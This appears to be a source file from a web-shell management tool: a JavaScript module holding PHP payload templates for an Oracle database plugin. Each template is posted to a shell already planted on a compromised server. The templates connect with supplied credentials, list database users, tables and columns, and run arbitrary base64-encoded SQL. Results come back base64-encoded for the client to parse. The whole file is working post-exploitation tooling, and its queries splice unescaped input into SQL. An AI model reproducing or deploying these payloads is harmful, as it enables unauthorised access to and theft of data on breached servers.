/**
 * 数据库管理模板::oracle oci8 驱动
 * i 数据分隔符号 => \t|\t
 *
 * session_mode: OCI_DEFAULT 0 OCI_SYSOPER 4 OCI_SYSDBA 2
 *
 */

module.exports = (arg1, arg2, arg3, arg4, arg5, arg6) => ({
  // 显示所有数据库
  show_databases: {
    _: `$m=get_magic_quotes_gpc();
      $sid=$m?stripslashes($_POST["${arg1}"]):$_POST["${arg1}"];
      $usr=$m?stripslashes($_POST["${arg2}"]):$_POST["${arg2}"];
      $pwd=$m?stripslashes($_POST["${arg3}"]):$_POST["${arg3}"];
      $chs="utf8";
      $mod=0;
      $H=@oci_connect($usr,$pwd,$sid,$chs,$mod);
      if(!$H){
        echo("ERROR://".@oci_error()["message"]);
      }else{
        $q=@oci_parse($H,"SELECT USERNAME FROM ALL_USERS ORDER BY 1");
        if(@oci_execute($q)){
          while(@oci_fetch($q)){
            echo(trim(@oci_result($q,1)).chr(9));
          }
        }else{
          echo("Status\t|\t\r\n");
          $e=@oci_error($q);
          if($e){
            echo(base64_encode("ERROR://{$e['message']} in [{$e['sqltext']}] col:{$e['offset']}")."\t|\t\r\n");
          }else{
            echo("RmFsc2U="."\t|\t\r\n");
          }
        }
        @oci_close($H);
      };`.replace(/\n\s+/g, ''),
    [arg1]: '#{host}',
    [arg2]: '#{user}',
    [arg3]: '#{passwd}'
  },
  // 显示数据库所有表
  show_tables: {
    _: `$m=get_magic_quotes_gpc();
      $sid=$m?stripslashes($_POST["${arg1}"]):$_POST["${arg1}"];
      $usr=$m?stripslashes($_POST["${arg2}"]):$_POST["${arg2}"];
      $pwd=$m?stripslashes($_POST["${arg3}"]):$_POST["${arg3}"];
      $dbn=$m?stripslashes($_POST["${arg4}"]):$_POST["${arg4}"];
      $chs="utf8";
      $mod=0;
      $sql="SELECT TABLE_NAME FROM (SELECT TABLE_NAME FROM ALL_TABLES WHERE OWNER='{$dbn}' ORDER BY 1)";
      $H=@oci_connect($usr,$pwd,$sid,$chs,$mod);
      if(!$H){
        echo("ERROR://".@oci_error()["message"]);
      }else{
        $q=@oci_parse($H,$sql);
        if(@oci_execute($q)){
          $n=@oci_fetch_all($q,$res,0,-1,OCI_FETCHSTATEMENT_BY_ROW+OCI_NUM);
          if($n==0){
            echo("ERROR://Database has no tables or no privilege");
          }else{
            for($i=0;$i<$n;$i++){
              $row=$res[$i];
              echo(trim($row[0]).chr(9));
            }
          }
        }else{
          echo("Status\t|\t\r\n");
          $e=@oci_error($q);
          if($e){
            echo(base64_encode("ERROR://{$e['message']} in [{$e['sqltext']}] col:{$e['offset']}")."\t|\t\r\n");
          }else{
            echo("RmFsc2U="."\t|\t\r\n");
          }
        }
        @oci_close($H);
      };`.replace(/\n\s+/g, ''),
    [arg1]: '#{host}',
    [arg2]: '#{user}',
    [arg3]: '#{passwd}',
    [arg4]: '#{db}'
  },
  // 显示表字段
  show_columns: {
    _: `$m=get_magic_quotes_gpc();
      $sid=$m?stripslashes($_POST["${arg1}"]):$_POST["${arg1}"];
      $usr=$m?stripslashes($_POST["${arg2}"]):$_POST["${arg2}"];
      $pwd=$m?stripslashes($_POST["${arg3}"]):$_POST["${arg3}"];
      $dbn=$m?stripslashes($_POST["${arg4}"]):$_POST["${arg4}"];
      $tab=$m?stripslashes($_POST["${arg5}"]):$_POST["${arg5}"];
      $sql="SELECT COLUMN_NAME,DATA_TYPE,DATA_LENGTH FROM ALL_TAB_COLUMNS WHERE OWNER='{$dbn}' AND TABLE_NAME='{$tab}' ORDER BY COLUMN_ID";
      $chs="utf8";
      $mod=0;
      $H=@oci_connect($usr,$pwd,$sid,$chs,$mod);
      if(!$H){
        echo("ERROR://".@oci_error()["message"]);
      }else{
        $q=@oci_parse($H,$sql);
        if(@oci_execute($q)){
          $n=@oci_fetch_all($q,$res,0,-1,OCI_FETCHSTATEMENT_BY_ROW+OCI_NUM);
          if($n==0){
            echo("ERROR://Table has no columns or no privilege");
          }else{
            for($i=0;$i<$n;$i++){
              $row=$res[$i];
              echo(trim($row[0])." (".$row[1]."(".$row[2]."))".chr(9));
            }
          }
        }else{
          echo("Status\t|\t\r\n");
          $e=@oci_error($q);
          if($e){
            echo(base64_encode("ERROR://{$e['message']} in [{$e['sqltext']}] col:{$e['offset']}")."\t|\t\r\n");
          }else{
            echo("RmFsc2U="."\t|\t\r\n");
          }
        }
        @oci_close($H);
      };`.replace(/\n\s+/g, ''),
    [arg1]: '#{host}',
    [arg2]: '#{user}',
    [arg3]: '#{passwd}',
    [arg4]: '#{db}',
    [arg5]: '#{table}'
  },
  // 执行SQL语句
  query: {
    _: `$m=get_magic_quotes_gpc();
      $sid=$m?stripslashes($_POST["${arg1}"]):$_POST["${arg1}"];
      $usr=$m?stripslashes($_POST["${arg2}"]):$_POST["${arg2}"];
      $pwd=$m?stripslashes($_POST["${arg3}"]):$_POST["${arg3}"];
      $dbn=$m?stripslashes($_POST["${arg4}"]):$_POST["${arg4}"];
      $sql=base64_decode($_POST["${arg5}"]);
      $chs=$m?stripslashes($_POST["${arg6}"]):$_POST["${arg6}"];;
      $chs=$chs?$chs:"utf8";
      $mod=0;
      $H=@oci_connect($usr,$pwd,$sid,$chs,$mod);
      if(!$H){
        echo("ERROR://".@oci_error()["message"]);
      }else{
        $q=@oci_parse($H,$sql);
        if(@oci_execute($q)) {
          $n=oci_num_fields($q);
          if($n==0){
            echo("Affect Rows\t|\t\r\n".base64_encode(@oci_num_rows($q))."\t|\t\r\n");
          }else{
            for($i=1;$i<=$n;$i++){
              echo(oci_field_name($q,$i)."\t|\t");
            }
            echo "\r\n";
            while ($row = @oci_fetch_array($q, OCI_ASSOC+OCI_RETURN_NULLS)) {
              foreach ($row as $item) {
                echo($item !== null ? base64_encode($item):"")."\t|\t";
              }
              echo "\r\n";
            }
            @oci_free_statement($q);
          }
        }else{
          echo("Status\t|\t\r\n");
          $e=@oci_error($q);
          if($e){
            echo(base64_encode("ERROR://{$e['message']} in [{$e['sqltext']}] col:{$e['offset']}")."\t|\t\r\n");
          }else{
            echo("RmFsc2U="."\t|\t\r\n");
          }
        }
        @oci_close($H);
      }`.replace(/\n\s+/g, ''),
    [arg1]: '#{host}',
    [arg2]: '#{user}',
    [arg3]: '#{passwd}',
    [arg4]: '#{db}',
    [arg5]: '#{base64::sql}',
    [arg6]: '#{encode}'
  }
})